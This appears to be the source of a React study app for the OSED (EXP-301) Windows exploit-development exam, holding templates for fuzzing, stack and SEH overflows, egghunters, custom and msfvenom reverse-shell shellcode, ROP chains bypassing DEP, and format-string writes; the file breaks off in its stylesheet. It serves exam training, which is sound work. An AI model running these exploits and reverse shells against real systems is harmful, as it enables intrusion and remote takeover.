const{useState,useEffect,useRef}=window.React;

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// OSED AUTOPILOT v1 — EXP-301 Decision Engine 2026
// Windows User Mode Exploit Development
// 47h45m exam | 3 tasks | Custom shellcode + ROP | 24h report
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

// ─── PHASE 0: RECON & REVERSING ───
const RECON_CHAIN=[
{phase:"0. Initial Analysis & Reversing",desc:"Identify the binary, its protections, and attack surface.",steps:[
{action:"Identify protections (checksec)",cmd:(v)=>`# In WinDbg:\n!checksec\n\n# Python (pefile):\nimport pefile\npe = pefile.PE("${v.binary||"target.exe"}")\nprint("ASLR:", bool(pe.OPTIONAL_HEADER.DllCharacteristics & 0x0040))\nprint("DEP/NX:", bool(pe.OPTIONAL_HEADER.DllCharacteristics & 0x0100))\nprint("SafeSEH:", bool(pe.OPTIONAL_HEADER.DllCharacteristics & 0x0400))\nprint("CFG:", bool(pe.OPTIONAL_HEADER.DllCharacteristics & 0x4000))`,check:"DEP? ASLR? SafeSEH? CFG?",critical:true},
{action:"Map the binary in IDA Pro",cmd:(v)=>`# IDA Pro:\n# 1. File -> Open -> ${v.binary||"target.exe"}\n# 2. Wait for auto-analysis\n# 3. Check Imports (Alt+T) for dangerous functions:\n#    strcpy, strcat, sprintf, scanf, gets, memcpy, recv\n# 4. Check Strings (Shift+F12) for paths, commands, versions\n# 5. Find main() or WinMain() -> trace execution flow`,check:"Dangerous functions? Entry point?",critical:true},
{action:"Attach WinDbg to process",cmd:(v)=>`# Attach to running process:\nwindbg -p PID\n\n# Or launch with WinDbg:\nwindbg ${v.binary||"target.exe"}\n\n# Essential WinDbg commands:\ng                    # Go / continue\nbp ADDRESS           # Set breakpoint\nbl                   # List breakpoints\nbc *                 # Clear all breakpoints\ndd esp               # Dump DWORD at ESP\nda esp               # Dump ASCII at ESP\ndb esp L100          # Dump bytes\nu eip                # Unassemble at EIP\n!exchain             # View SEH chain\nlm                   # List loaded modules\n!address             # Show memory layout`,check:"Debugger attached? Breakpoints set?",critical:true},
{action:"Fuzz the target",cmd:(v)=>`# Python fuzzer template:\nimport socket, sys, struct\n\ntarget = "${v.target||"127.0.0.1"}"\nport = ${v.port||"9999"}\n\nbuf = b"A" * 100\nwhile True:\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((target, int(port)))\n        s.send(buf)\n        s.close()\n        buf += b"A" * 100\n        print(f"[*] Sent {len(buf)} bytes")\n    except:\n        print(f"[!] Crashed at {len(buf)} bytes")\n        sys.exit(0)`,check:"Crash found? At how many bytes?"},
{action:"Find exact offset (pattern)",cmd:(v)=>`# Generate pattern:\nmsf-pattern_create -l 5000\n\n# After crash, find offset:\nmsf-pattern_offset -l 5000 -q EIP_VALUE\n\n# Or in Python:\nfrom pwn import *\ncyclic(5000)           # generate\ncyclic_find(0x41386141) # find offset\n\n# Verify: send offset*A + BBBB\n# EIP should be 0x42424242`,check:"Exact EIP offset found?",critical:true},
]},
];

// ─── PHASE 1: STACK BUFFER OVERFLOW ───
const STACK_CHAIN=[
{phase:"1. Classic Stack Buffer Overflow",desc:"Overwrite EIP, control execution flow, execute shellcode.",steps:[
{action:"Confirm EIP control",cmd:(v)=>`import socket, struct\n\noffset = ${v.offset||"OFFSET"}  # from pattern_offset\nbuf = b"A" * offset\nbuf += struct.pack("<I", 0x42424242)  # EIP = BBBB\nbuf += b"C" * 200  # padding after EIP\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(("${v.target||"127.0.0.1"}", ${v.port||"9999"}))\ns.send(buf)\ns.close()\n\n# In WinDbg: EIP should be 0x42424242\n# ESP should point to the C's`,check:"EIP = 42424242? ESP -> C buffer?",critical:true},
{action:"Find bad characters",cmd:(v)=>`# Send ALL bytes 0x00-0xFF after EIP:\nbadchars = bytes(range(0,256))\n\nbuf = b"A" * offset\nbuf += b"BBBB"  # EIP placeholder\nbuf += badchars\n\n# In WinDbg: db esp L100\n# Compare with expected sequence\n# Note bytes that are missing/mangled\n# Common bad: 0x00, 0x0a, 0x0d, 0x20`,check:"Bad chars identified?",critical:true},
{action:"Find JMP ESP",cmd:(v)=>`# In WinDbg:\n!mona jmp -r esp -cpb "\\x00\\x0a\\x0d"  # exclude bad chars\n\n# Or manual search:\n# JMP ESP = FF E4\nlm   # list modules (find one without ASLR/SafeSEH)\ns MODULE_BASE MODULE_END ff e4\n\n# CALL ESP = FF D4\ns MODULE_BASE MODULE_END ff d4\n\n# PUSH ESP; RET = 54 C3\ns MODULE_BASE MODULE_END 54 c3`,check:"JMP ESP address found? No bad chars in address?",critical:true},
{action:"Generate shellcode",cmd:(v)=>`# Reverse shell:\nmsfvenom -p windows/shell_reverse_tcp LHOST=${v.lhost||"LHOST"} LPORT=${v.lport||"443"} -b "\\x00\\x0a\\x0d" -f python -v shellcode\n\n# Bind shell:\nmsfvenom -p windows/shell_bind_tcp LPORT=4444 -b "\\x00\\x0a\\x0d" -f python -v shellcode\n\n# Exec calc (testing):\nmsfvenom -p windows/exec CMD=calc.exe -b "\\x00\\x0a\\x0d" -f python -v shellcode`,check:"Shellcode generated? No bad chars?"},
{action:"Final exploit",cmd:(v)=>`import socket, struct\n\noffset = ${v.offset||"OFFSET"}\njmp_esp = struct.pack("<I", 0xDEADBEEF)  # JMP ESP address\nnops = b"\\x90" * 16\nshellcode = b""  # msfvenom output\n\nbuf = b"A" * offset\nbuf += jmp_esp\nbuf += nops\nbuf += shellcode\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(("${v.target||"127.0.0.1"}", ${v.port||"9999"}))\ns.send(buf)\ns.close()\nprint("[+] Exploit sent!")`,check:"Shell received on listener?",critical:true},
]},
];

// ─── PHASE 2: SEH OVERFLOW ───
const SEH_CHAIN=[
{phase:"2. SEH (Structured Exception Handler) Overflow",desc:"Overwrite SEH chain → POP POP RET → jump to shellcode.",steps:[
{action:"Identify SEH overwrite",cmd:(v)=>`# After crash, in WinDbg:\n!exchain\n# Shows: SEH record at ADDR: HANDLER_ADDR\n# If handler = 41414141, you control SEH\n\n# Find nSEH and SEH offsets:\nmsf-pattern_offset -l 5000 -q HANDLER_VALUE\n# nSEH = offset - 4, SEH = offset`,check:"SEH handler overwritten?",critical:true},
{action:"Find POP POP RET (PPR)",cmd:(v)=>`# In WinDbg (mona):\n!mona seh -cpb "\\x00\\x0a\\x0d"\n\n# Manual search for POP r32; POP r32; RET:\n# POP EAX; POP EBX; RET = 58 5B C3\n# POP ESI; POP EDI; RET = 5E 5F C3\n# POP EBP; POP EBX; RET = 5D 5B C3\n\n# Must be in module WITHOUT SafeSEH!\nlm  # list modules\n!mona modules  # check SafeSEH status`,check:"PPR address found? Module without SafeSEH?",critical:true},
{action:"Build SEH exploit",cmd:(v)=>`import socket, struct\n\nnseh_offset = ${v.offset||"OFFSET"}  # offset to nSEH\n\n# nSEH: short jump forward (over SEH into shellcode)\n# EB 06 = JMP SHORT +6 (jump 6 bytes forward)\nnseh = b"\\xeb\\x06\\x90\\x90"\n\n# SEH: POP POP RET address\nseh = struct.pack("<I", 0xDEADBEEF)  # PPR address\n\nnops = b"\\x90" * 16\nshellcode = b""  # your shellcode here\n\nbuf = b"A" * nseh_offset\nbuf += nseh        # short jmp forward\nbuf += seh         # POP POP RET\nbuf += nops\nbuf += shellcode\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(("${v.target||"127.0.0.1"}", ${v.port||"9999"}))\ns.send(buf)`,check:"Short jump → shellcode?",critical:true},
{action:"Trigger exception",cmd:(v)=>`# The overflow must cause an exception!\n# Common triggers:\n# - Access violation (write past buffer)\n# - Division by zero\n# - Invalid memory access\n\n# Flow: Exception -> SEH chain -> your PPR\n# PPR -> POP,POP,RET -> lands on nSEH\n# nSEH = JMP SHORT -> lands on shellcode`,check:"Exception triggered? SEH chain followed?"},
]},
];

// ─── PHASE 3: EGGHUNTER ───
const EGG_CHAIN=[
{phase:"3. Egghunter — Limited Space Exploits",desc:"When buffer is too small for shellcode, search memory for egg tag.",steps:[
{action:"Determine available space",cmd:(v)=>`# After controlling EIP/SEH:\n# Check how many bytes you can write\n# If < 400 bytes available -> use egghunter\n\n# In WinDbg:\ndb esp L200  # check space after ESP\ndb eip-100 L200  # check space before crash`,check:"Less than ~400 bytes available?",critical:true},
{action:"Generate egghunter",cmd:(v)=>`# WinDbg mona:\n!mona egg -t w00t -cpb "\\x00\\x0a\\x0d"\n\n# 32-byte NtAccessCheckAndAuditAlarm egghunter:\negghunter = (\n    b"\\x66\\x81\\xca\\xff\\x0f"   # or dx, 0x0fff\n    b"\\x42"                     # inc edx\n    b"\\x52"                     # push edx\n    b"\\x6a\\x02"                 # push 0x2\n    b"\\x58"                     # pop eax\n    b"\\xcd\\x2e"                 # int 0x2e (syscall)\n    b"\\x3c\\x05"                 # cmp al, 0x5\n    b"\\x5a"                     # pop edx\n    b"\\x74\\xef"                 # je short (back to inc edx)\n    b"\\xb8" + b"w00t"           # mov eax, "w00t"\n    b"\\x8b\\xfa"                 # mov edi, edx\n    b"\\xaf"                     # scasd\n    b"\\x75\\xea"                 # jne short (back to inc edx)\n    b"\\xaf"                     # scasd\n    b"\\x75\\xe7"                 # jne short\n    b"\\xff\\xe7"                 # jmp edi\n)`,check:"Egghunter code ready?",critical:true},
{action:"Place egg + shellcode in memory",cmd:(v)=>`# The egg (w00tw00t) + shellcode must be\n# SOMEWHERE in process memory\n\negg = b"w00tw00t"\nshellcode = b""  # your full shellcode\n\n# Send in a DIFFERENT buffer/field:\n# - HTTP header\n# - Different protocol command\n# - Username/password field\n# - Second connection\n\n# The egghunter will scan all memory for w00tw00t\n# and jump to the shellcode after it`,check:"Egg+shellcode sent to another buffer?"},
{action:"Final egghunter exploit",cmd:(v)=>`import socket, struct\n\n# Stage 1: Small buffer with egghunter\noffset = ${v.offset||"OFFSET"}\njmp_esp = struct.pack("<I", 0xDEADBEEF)\n\nbuf1 = b"A" * offset\nbuf1 += jmp_esp\nbuf1 += b"\\x90" * 8\nbuf1 += egghunter\n\n# Stage 2: Tag + shellcode (sent separately)\nbuf2 = b"w00tw00t"\nbuf2 += shellcode\n\n# Send stage 2 first, then stage 1\ns = socket.socket(...)\ns.send(buf2)  # egg goes into memory\ns.send(buf1)  # egghunter finds it`,check:"Egghunter finds egg? Shell received?",critical:true},
]},
];

// ─── PHASE 4: CUSTOM SHELLCODE ───
const SHELLCODE_CHAIN=[
{phase:"4. Custom Shellcode Development",desc:"Write position-independent, null-free Windows shellcode from scratch.",steps:[
{action:"Find kernel32.dll base (PEB walk)",cmd:(v)=>`; x86 ASM — Walk PEB to find kernel32.dll\nxor ecx, ecx\nmov eax, fs:[ecx+0x30]    ; PEB\nmov eax, [eax+0x0c]       ; PEB->Ldr\nmov esi, [eax+0x14]       ; InMemoryOrderModuleList\nlodsd                     ; 1st entry (ntdll.dll)\nxchg eax, esi\nlodsd                     ; 2nd entry (kernel32.dll)\nmov ebx, [eax+0x10]       ; kernel32 base address\n; EBX = kernel32.dll base`,check:"kernel32 base in EBX?",critical:true},
{action:"Resolve function (Export Table)",cmd:(v)=>`; Walk PE export table to find function by hash\n; EBX = module base, target function hash in stack\nmov edx, [ebx+0x3c]       ; PE header offset\nmov edx, [ebx+edx+0x78]  ; Export table RVA\nadd edx, ebx              ; Export table VA\nmov esi, [edx+0x20]       ; AddressOfNames RVA\nadd esi, ebx              ; AddressOfNames VA\nxor ecx, ecx              ; counter = 0\n\n.loop:\ninc ecx\nlodsd                     ; name RVA\nadd eax, ebx              ; name VA\n; Hash the name and compare with target hash\ncmp [computed_hash], target_hash\njne .loop\n\n; ECX = function ordinal index\nmov esi, [edx+0x24]       ; AddressOfNameOrdinals\nadd esi, ebx\nmovzx ecx, word [esi+ecx*2]  ; ordinal\nmov esi, [edx+0x1c]       ; AddressOfFunctions\nadd esi, ebx\nmov edx, [esi+ecx*4]      ; function RVA\nadd edx, ebx              ; function VA => EDX`,check:"Function address resolved?",critical:true},
{action:"WinExec shellcode",cmd:(v)=>`; Minimal WinExec("calc.exe", 0) shellcode\n; Requires: EBX = kernel32 base\n; Resolve WinExec address using export table walk\n\nxor ecx, ecx\npush ecx                  ; null terminator\npush 0x6578652e           ; "exe."\npush 0x636c6163           ; "calc"\nmov eax, esp              ; EAX -> "calc.exe"\npush ecx                  ; uCmdShow = 0\npush eax                  ; lpCmdLine\ncall edx                  ; WinExec("calc.exe", 0)`,check:"calc.exe pops up?"},
{action:"Reverse shell shellcode",cmd:(v)=>`; Full reverse shell: WSAStartup -> WSASocket -> connect -> CreateProcess\n; 1. Resolve ws2_32.dll (LoadLibraryA)\n; 2. WSAStartup(0x0202, &wsadata)\n; 3. WSASocketA(AF_INET=2, SOCK_STREAM=1, 0,0,0,0)\n; 4. connect(sock, &sockaddr{AF_INET, port, ip}, 16)\n; 5. CreateProcessA("cmd.exe",0,0,0,1,0,0,0,&si{hStdIn/Out/Err=sock},&pi)\n\n; sockaddr struct:\npush ${v.lhost?'0x'+(v.lhost.split('.').map(x=>parseInt(x).toString(16).padStart(2,'0')).reverse().join('')):'0x0100007f'}  ; IP (little-endian)\npush 0x${v.lport?parseInt(v.lport).toString(16).padStart(4,'0').match(/../g).reverse().join(''):'bb01'}0002  ; port + AF_INET`,check:"Reverse shell connects?",critical:true},
{action:"Null-free techniques",cmd:(v)=>`; Avoid 0x00 bytes:\n\n; BAD: mov eax, 0       => B8 00 00 00 00\n; GOOD: xor eax, eax    => 31 C0\n\n; BAD: push 0            => 6A 00\n; GOOD: xor ecx,ecx; push ecx  => 31 C9 51\n\n; BAD: mov eax, 0x00000001 => contains nulls\n; GOOD: xor eax,eax; inc eax => 31 C0 40\n\n; Test for nulls:\nobjdump -d shellcode.o | grep ' 00 '\n# Or:\npython3 -c "sc=open('sc.bin','rb').read(); print('Null at:',sc.index(0) if 0 in sc else 'CLEAN')"`,check:"No null bytes in shellcode?",critical:true},
]},
];

// ─── PHASE 5: DEP/ASLR BYPASS (ROP) ───
const ROP_CHAIN=[
{phase:"5. DEP Bypass — Return Oriented Programming",desc:"Chain gadgets from non-ASLR modules to call VirtualProtect/VirtualAlloc.",steps:[
{action:"Find non-ASLR modules",cmd:(v)=>`# In WinDbg:\n!mona modules\n# Look for modules with:\n# - ASLR: False\n# - Rebase: False\n# - DEP: True (DEP is what we bypass)\n# - SafeSEH: doesn't matter for ROP\n\n# Or:\nlm   # list all modules\n!address -f:VAR  # list variable regions`,check:"Non-ASLR DLL found for gadgets?",critical:true},
{action:"Generate ROP gadgets",cmd:(v)=>`# Using mona:\n!mona rop -m "module.dll" -cpb "\\x00\\x0a\\x0d"\n\n# Using ropper:\nropper --file module.dll --search "pop eax"\nropper --file module.dll --search "ret"\nropper --file module.dll --type rop\n\n# Using rp++:\nrp-win.exe -f module.dll --rop=5 --unique\n\n# Key gadgets needed:\n# POP EAX; RET\n# POP ECX; RET\n# POP EDX; RET\n# MOV [EAX], ECX; RET\n# PUSHAD; RET\n# XCHG EAX, ESP; RET`,check:"Gadgets found? No bad chars?",critical:true},
{action:"ROP chain: VirtualProtect",cmd:(v)=>`# VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)\n# Makes shellcode memory region executable\n\n# Skeleton:\nrop = b""\nrop += struct.pack("<I", 0x11111111)  # POP EAX; RET\nrop += struct.pack("<I", 0x22222222)  # ptr to VirtualProtect IAT\nrop += struct.pack("<I", 0x33333333)  # MOV EAX,[EAX]; RET  (dereference IAT)\n# ... build args on stack:\n# lpAddress  = address of shellcode (ESP after PUSHAD)\n# dwSize     = 0x201 (or bigger)\n# flNewProtect = 0x40 (PAGE_EXECUTE_READWRITE)\n# lpflOldProtect = writable address\nrop += struct.pack("<I", 0x44444444)  # PUSHAD; RET`,check:"VirtualProtect ROP chain built?",critical:true},
{action:"ROP chain: VirtualAlloc",cmd:(v)=>`# VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)\n# Allocate new RWX memory, copy shellcode there\n\n# Args:\n# lpAddress = 0x00 (let kernel choose)\n# dwSize = 0x1000\n# flAllocationType = 0x3000 (MEM_COMMIT | MEM_RESERVE)\n# flProtect = 0x40 (PAGE_EXECUTE_READWRITE)\n\n# After VirtualAlloc returns:\n# EAX = address of new RWX region\n# Copy shellcode to EAX, jump to it`,check:"VirtualAlloc ROP alternative?"},
{action:"ROP chain: WriteProcessMemory",cmd:(v)=>`# WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpBytesWritten)\n# Write shellcode to executable .text section\n\n# Args:\n# hProcess = -1 (current process = 0xFFFFFFFF)\n# lpBaseAddress = address in .text section\n# lpBuffer = ESP (shellcode on stack)\n# nSize = shellcode length\n# lpBytesWritten = writable address`,check:"WPM as alternative to VirtualProtect?"},
{action:"Final ROP exploit",cmd:(v)=>`import socket, struct\n\noffset = ${v.offset||"OFFSET"}\n\n# ROP chain\nrop = b""\nrop += struct.pack("<I", 0xAAAAAAAA)  # gadget 1\n# ... rest of chain\n\nnops = b"\\x90" * 16\nshellcode = b""  # custom or msfvenom\n\nbuf = b"A" * offset\nbuf += rop          # instead of JMP ESP\nbuf += nops\nbuf += shellcode    # now executable thanks to ROP\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(("${v.target||"127.0.0.1"}", ${v.port||"9999"}))\ns.send(buf)\nprint("[+] ROP exploit sent!")`,check:"DEP bypassed? Shell received?",critical:true},
]},
{phase:"6. ASLR Bypass Techniques",desc:"Defeat address randomization to make ROP viable.",steps:[
{action:"Find non-ASLR modules",cmd:(v)=>`# Primary technique: Use modules compiled WITHOUT ASLR\n!mona modules\n# Look for ASLR=False, Rebase=False\n\n# Common non-ASLR: application DLLs,\n# old 3rd-party DLLs, some system DLLs`,check:"Any loaded DLL without ASLR?",critical:true},
{action:"Partial overwrite",cmd:(v)=>`# If only low 2 bytes of address are randomized:\n# Overwrite only the last 2 bytes of return address\n# Low 16 bits are often predictable\n\n# Works with stack cookies/partial ASLR`,check:"Partial overwrite viable?"},
{action:"Information leak",cmd:(v)=>`# Leak a pointer from the process:\n# - Format string vulnerability\n# - Partial stack read\n# - Uninitialized memory\n# - Error messages with addresses\n\n# Once leaked: calculate module base\n# base = leaked_addr - known_offset`,check:"Can leak an address?"},
]},
];

// ─── PHASE 6: FORMAT STRING ───
const FORMAT_CHAIN=[
{phase:"7. Format String Attacks",desc:"Exploit printf-family functions to read/write arbitrary memory.",steps:[
{action:"Identify format string bug",cmd:(v)=>`# Test with format specifiers:\n%x%x%x%x           # Read stack values\n%p%p%p%p           # Read pointers\n%s                  # Read string at pointer\nAAAA%08x.%08x.%08x.%08x  # Find your input on stack\n\n# In code look for:\n# printf(user_input)     <-- VULNERABLE\n# printf("%s", user_input) <-- SAFE`,check:"Stack values leaked? Input on stack?",critical:true},
{action:"Find your buffer offset",cmd:(v)=>`# Send: AAAA%08x.%08x.%08x...\n# Find where 41414141 appears\n# That's your direct parameter offset\n\n# Direct parameter access:\nAAAA%N$x  # where N = offset\n# Example: AAAA%7$x => should print 41414141`,check:"Direct offset found? (e.g., %7$x)",critical:true},
{action:"Arbitrary READ",cmd:(v)=>`# Read from any address:\n# Place target address in buffer, use %s at offset\n\nimport struct\ntarget_addr = struct.pack("<I", 0xDEADBEEF)\npayload = target_addr + b"%7$s"\n\n# This reads string at 0xDEADBEEF\n# Use to leak stack canaries, function pointers, etc.`,check:"Can read arbitrary memory?"},
{action:"Arbitrary WRITE (%n)",cmd:(v)=>`# %n writes number of printed chars to address\n# Write 4 bytes in 2 writes (short write technique):\n\nimport struct\n\n# Target: write VALUE to ADDRESS\naddress = 0xDEADBEEF\nvalue = 0xCAFEBABE\n\n# Low 2 bytes to address, high 2 bytes to address+2\nlow = value & 0xFFFF        # 0xBABE\nhigh = (value >> 16) & 0xFFFF  # 0xCAFE\n\n# payload = addr_low + addr_high + format_string\npayload = struct.pack("<I", address)\npayload += struct.pack("<I", address + 2)\npayload += f"%{low-8}x%N$hn".encode()    # write low\npayload += f"%{high-low}x%{N+1}$hn".encode()  # write high\n\n# %hn = write 2 bytes (SHORT)\n# %n  = write 4 bytes`,check:"Can write to arbitrary address?",critical:true},
{action:"GOT overwrite -> RCE",cmd:(v)=>`# Overwrite GOT entry of a function that will be called:\n# e.g., overwrite printf@GOT with shellcode address\n\n# 1. Find GOT address:\nobjdump -R ${v.binary||"target.exe"} | grep printf\n# Or in IDA: check .idata section\n\n# 2. Find shellcode address (or JMP ESP)\n# 3. Use format string write to overwrite GOT entry\n# 4. Next call to printf() -> jumps to your code`,check:"GOT overwritten? Function hijacked?",critical:true},
]},
];

// ─── CHECKLIST ───
const CHECKLIST={
"Task 1 (Binary Analysis + Exploit)":[
"Binary loaded in IDA Pro","Protections identified (DEP/ASLR/SafeSEH)",
"Vulnerability found (type: BOF/SEH/FmtStr)","Exact crash offset determined",
"Bad characters identified","Exploit developed (JMP ESP / ROP / etc.)",
"Custom shellcode written (if required)","proof.txt retrieved from admin desktop",
"Full exploit documented with screenshots",
],
"Task 2 (Binary Analysis + Exploit)":[
"Binary loaded in IDA Pro","Protections identified",
"Vulnerability found","Exact crash offset determined",
"Bad characters identified","Exploit developed",
"Custom shellcode written (if required)","proof.txt retrieved",
"Full exploit documented",
],
"Task 3 (Binary Analysis + Exploit)":[
"Binary loaded in IDA Pro","Protections identified",
"Vulnerability found","Exact crash offset determined",
"Bad characters identified","Exploit developed",
"Custom shellcode written (if required)","proof.txt retrieved",
"Full exploit documented",
],
"Report":[
"Each exploit fully documented step-by-step","Vulnerability discovery process explained",
"All custom shellcode source included","Screenshots of proof.txt for each task",
"ROP chain explained gadget-by-gadget","Report in PDF, uploaded within 24h",
],
};

// ─── MILESTONES ───
const MILESTONES=[
{hour:0,label:"START — Open all 3 binaries in IDA. Identify protections."},
{hour:2,label:"Task 1: Reversing done. Vulnerability found. Start exploit."},
{hour:6,label:"Task 1: Exploit working. proof.txt captured."},
{hour:10,label:"Task 2: Reversing & vulnerability analysis."},
{hour:16,label:"Task 2: Exploit complete. SLEEP."},
{hour:24,label:"Resume. Task 3: Reversing."},
{hour:30,label:"Task 3: Exploit development."},
{hour:36,label:"Task 3: Complete. All 3 tasks done."},
{hour:42,label:"Review all exploits. Clean up code. Document."},
{hour:47.75,label:"EXAM ENDS — Begin 24-hour report."},
];

// ─── QUICK REF ───
const QUICK_REF={
"WinDbg Essentials":[
{l:"Attach",c:"windbg -p PID"},{l:"Break",c:"Ctrl+Break"},
{l:"Continue",c:"g"},{l:"Step over",c:"p"},{l:"Step into",c:"t"},
{l:"Breakpoint",c:"bp ADDRESS"},{l:"List BPs",c:"bl"},{l:"Clear BPs",c:"bc *"},
{l:"Dump DWORD",c:"dd esp"},{l:"Dump bytes",c:"db esp L100"},{l:"Dump ASCII",c:"da esp"},
{l:"Unassemble",c:"u eip"},{l:"SEH chain",c:"!exchain"},{l:"Modules",c:"lm"},
{l:"Search bytes",c:"s MODULE_BASE MODULE_END ff e4"},{l:"Memory map",c:"!address"},
{l:"Stack trace",c:"kb"},{l:"Registers",c:"r"},{l:"TEB",c:"!teb"},{l:"PEB",c:"!peb"},
],
"IDA Pro Shortcuts":[
{l:"Rename",c:"N"},{l:"Cross-refs to",c:"X"},{l:"Cross-refs from",c:"Ctrl+X"},
{l:"Go to address",c:"G"},{l:"Strings",c:"Shift+F12"},{l:"Imports",c:"Ctrl+F12"},
{l:"Functions list",c:"Shift+F3"},{l:"Graph view",c:"Space"},{l:"Decompile (Hex-Rays)",c:"F5"},
{l:"Set breakpoint",c:"F2"},{l:"Comment",c:":"},{l:"Search bytes",c:"Alt+B"},
{l:"Structures",c:"Shift+F9"},{l:"Patch bytes",c:"Edit > Patch program > Assemble"},
],
"Mona Commands":[
{l:"Find JMP ESP",c:"!mona jmp -r esp -cpb \"\\x00\""},{l:"Find PPR (SEH)",c:"!mona seh -cpb \"\\x00\""},
{l:"Generate pattern",c:"!mona pattern_create 5000"},{l:"Find offset",c:"!mona pattern_offset EIP_VALUE"},
{l:"ROP gadgets",c:"!mona rop -m \"module.dll\" -cpb \"\\x00\""},{l:"Egghunter",c:"!mona egg -t w00t"},
{l:"Module info",c:"!mona modules"},{l:"Bad chars compare",c:"!mona compare -f badchars.bin -a ESP_ADDR"},
{l:"Stack pivot",c:"!mona stackpivot"},{l:"Find gadgets",c:"!mona find -s \"\\xff\\xe4\" -m module.dll"},
],
"x86 Opcodes":[
{l:"JMP ESP",c:"\\xff\\xe4"},{l:"CALL ESP",c:"\\xff\\xd4"},{l:"PUSH ESP; RET",c:"\\x54\\xc3"},
{l:"JMP SHORT +6",c:"\\xeb\\x06"},{l:"NOP",c:"\\x90"},{l:"INT3 (break)",c:"\\xcc"},
{l:"RET",c:"\\xc3"},{l:"XOR EAX,EAX",c:"\\x31\\xc0"},{l:"PUSH EAX",c:"\\x50"},
{l:"MOV EAX,[ESP]",c:"\\x8b\\x04\\x24"},{l:"ADD ESP,8",c:"\\x83\\xc4\\x08"},
],
"Function Hashes (Shellcode)":[
{l:"WinExec",c:"0x0E8AFE98"},{l:"LoadLibraryA",c:"0x0726774C"},
{l:"GetProcAddress",c:"0x7C0DFCAA"},{l:"ExitProcess",c:"0x56A2B5F0"},
{l:"WSAStartup",c:"0x006B8029"},{l:"WSASocketA",c:"0x0E0DF0FE"},
{l:"connect",c:"0x6174A599"},{l:"CreateProcessA",c:"0x863FCC79"},
{l:"VirtualAlloc",c:"0xE553A458"},{l:"VirtualProtect",c:"0x7946C61B"},
],
"Python Exploit Helpers":[
{l:"Pack address (LE)",c:"struct.pack('<I', 0xDEADBEEF)"},{l:"Unpack",c:"struct.unpack('<I', data)[0]"},
{l:"Pattern create",c:"from pwn import *; cyclic(5000)"},{l:"Pattern find",c:"cyclic_find(0x41386141)"},
{l:"Socket connect",c:"s=socket.socket(); s.connect(('IP',PORT)); s.send(buf)"},
{l:"Hex string",c:"''.join(f'\\\\x{b:02x}' for b in shellcode)"},
],
"Shellcode & Encoding":[
{l:"Reverse shell",c:"msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -b '\\x00' -f python"},
{l:"Bind shell",c:"msfvenom -p windows/shell_bind_tcp LPORT=4444 -b '\\x00' -f python"},
{l:"Staged",c:"msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=443 -b '\\x00' -f python"},
{l:"Calc (test)",c:"msfvenom -p windows/exec CMD=calc.exe -b '\\x00' -f python"},
{l:"XOR encoder",c:"msfvenom -p windows/exec CMD=calc.exe -e x86/xor -f python"},
{l:"Custom compile",c:"nasm -f elf32 shell.asm -o shell.o && ld -m elf_i386 shell.o -o shell"},
{l:"Extract bytes",c:"objdump -d shell.o | grep -Po '\\s\\K[a-f0-9]{2}(?=\\s)' | tr -d '\\n'"},
{l:"Check nulls",c:"python3 -c \"d=open('sc.bin','rb').read();print('NULL' if 0 in d else 'CLEAN')\""},
],
};

// ━━━ CSS ━━━
const CSS=`
@import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=Outfit:wght@400;500;600;700;800;900&display=swap');
:root{--b0:#06080b;--b1:#0b0e13;--b2:#111519;--b3:#191e26;--b4:#222831;--bd:#272e38;--bd2:#333c4a;--t0:#f3f5f7;--t1:#b3bcc8;--t2:#6c7585;--ac:#f97316;--acd:rgba(249,115,22,0.1);--g:#22c55e;--gd:rgba(34,197,94,0.08);--r:#ef4444;--y:#eab308;--cg:#6ee7b7;--m:'IBM Plex Mono',monospace;--s:'Outfit',system-ui,sans-serif}
*{margin:0;padding:0;box-sizing:border-box}body{background:var(--b0);color:var(--t1);font-family:var(--s)}
.app{min-height:100vh;display:flex;flex-direction:column}
.hdr{background:var(--b1);border-bottom:1px solid var(--bd);padding:12px 16px;display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap}
.logo{font-family:var(--s);font-weight:900;font-size:18px;letter-spacing:-0.5px;background:linear-gradient(135deg,#f97316,#ef4444,#dc2626);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.logo-sub{font-size:9px;color:var(--t2);letter-spacing:3px;text-transform:uppercase;font-weight:500}
.inps{display:flex;gap:4px;flex-wrap:wrap}
.inp{background:var(--b0);border:1px solid var(--bd);border-radius:4px;padding:5px 7px;color:var(--t0);font-size:10px;font-family:var(--m);outline:none;width:110px;transition:border .2s}
.inp:focus{border-color:var(--ac)}.inp::placeholder{color:var(--t2)}
.tabs{display:flex;background:var(--b1);border-bottom:1px solid var(--bd);overflow-x:auto;padding:0 8px;gap:1px}
.tab{padding:8px 12px;font-size:11px;font-weight:600;font-family:var(--s);color:var(--t2);background:none;border:none;cursor:pointer;border-bottom:2px solid transparent;white-space:nowrap;transition:all .15s}
.tab:hover{color:var(--t1)}.tab.on{color:var(--ac);border-bottom-color:var(--ac);background:var(--b2)}
.main{flex:1;padding:14px 16px;max-width:1100px;margin:0 auto;width:100%}
.phase{background:var(--b2);border:1px solid var(--bd);border-radius:8px;margin-bottom:10px;overflow:hidden}
.phase-h{padding:10px 14px;cursor:pointer;display:flex;align-items:center;gap:10px;transition:background .1s}
.phase-h:hover{background:var(--b3)}
.phase-num{width:26px;height:26px;border-radius:6px;background:var(--acd);border:1px solid var(--ac);display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:800;color:var(--ac);flex-shrink:0}
.phase-num.done{background:var(--g);border-color:var(--g);color:#fff}
.phase-title{font-size:13px;font-weight:700;color:var(--t0)}
.phase-desc{font-size:11px;color:var(--t2)}
.steps-wrap{border-top:1px solid var(--bd)}
